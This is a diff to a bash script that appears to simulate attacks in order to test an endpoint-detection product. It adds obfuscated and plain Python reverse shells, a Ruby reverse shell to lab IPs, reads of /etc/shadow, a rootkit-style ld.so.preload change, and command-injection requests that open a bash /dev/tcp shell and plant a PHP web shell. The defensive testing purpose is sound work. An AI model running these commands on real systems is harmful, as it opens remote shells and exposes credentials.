@@ -1,5 +1,5 @@
 #!/bin/bash
-set -uxo pipefail
+set -euxo pipefail
 
 function header () {
   echo "===== $1 ====="
@@ -74,6 +74,45 @@ header "Test #4 - Access /etc/{shadow,passwd} with shell builtins" | tee -a $INF
 function testcat(){ echo "$(< $1)"; }
 testcat /etc/passwd > $output_file
 testcat /etc/shadow > $output_file
+
+
+# Extra tests
+header "Executing Collection via Automated Collection script. Trying to dump information from etc/passwd" | tee -a $INFO
+sudo sh -c "/bin/grep 'x:0:' /etc/passwd > /tmp/passwords"
+
+header "Executing Command and Control via Remote Access Tools using obfuscated Python script. A Falcon Prevent action can kill the attempt" | tee -a $INFO
+sudo python -c 'import base64;dec=base64.b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4xNy4wLjIxIiw1NTU1KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItIl0pOw==");eval(compile(dec,"<string>","exec"))' || true
+sudo python3 -c 'import base64;dec=base64.b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4xNy4wLjIxIiw1NTU1KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItIl0pOw==");eval(compile(dec,"<string>","exec"))' || true
+
+header "Executing Command and Control via Remote Access Tools using Ruby script. This script will try to connect to 192.168.1.222 and will exit at fork. A Falcon Prevent action can kill the attempt" | tee -a $INFO
+sudo ruby -rsocket -e'exit if fork;s=TCPSocket.new("192.168.1.222",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd=="exit";puts s.recv(1000000);end' || true
+
+header "Executing Container Drift via file creation script. Creating a file and then executing it." | tee -a $INFO
+sudo sh -c "rm -f /bin/id2 ; cp /bin/id /bin/id2; /bin/id2 > /dev/null"
+
+header "Executing Defense Evasion via Masquerading. This script excutes a renamed copy of /usr/bin/whoami causing a contradicting file extension" | tee -a $INFO
+sudo cp /usr/bin/whoami ./whoami.rtf
+sudo ./whoami.rtf
+
+header "Executing Defense Evasion via Rootkit.This script will change the group owner to '0' of /etc/ld.so.preload indicative for a Jynx Rootkit" | tee -a $INFO
+sudo touch /etc/ld.so.preload
+sudo chgrp 0 /etc/ld.so.preload
+
+header "Executing Execution via Command-Line Interface. This script is causing malicious activity related suspicious CLI commands" | tee -a $INFO
+sudo sh -c whoami '[S];pwd;echo [E]'
+
+header "Executing Persistence via External Remote Services via Python script. This script will try creating presistance to 192.168.1.222. A Falcon Prevent action can kill the attempt" | tee -a $INFO
+sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.21",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-"]);' || true
+
+header "Executing Command Injection to execute reverse shell." | tee -a $INFO
+sudo curl -X POST -d "ip=1.1.1.1+%26%26+bash+-i+%3E%26+%2Fdev%2Ftcp%2F172.17.0.21%2F1111+0%3E%261&Submit=Submit" http://localhost/low.php || true
+
+header "Executing Command Injection to Spawn a Suspicious Terminal. This script excutes a command injection, which writes a file to http://webserver/uploads/test.php, then executes that script" | tee -a $INFO
+sudo curl -X POST -d "ip=1.1.1.1+%26%26+echo+%27%3C%3Fphp+shell_exec%28%22whoami%22%29%3B+%3F%3E%27+%3E+uploads%2Ftest.php&Submit=Submit" http://localhost/low.php || true
+sudo curl http://localhost/uploads/test.php || true
+
+header "Executing Command Injection to dump MySQL Server tables." | tee -a $INFO
+sudo curl -X POST -d "ip=1.1.1.1+%26%26+mysqldump+-u&Submit=Submit" http://localhost/low.php || true
 
 header "Cleanup of $output_file" | tee -a $INFO
 sudo rm -f $output_file
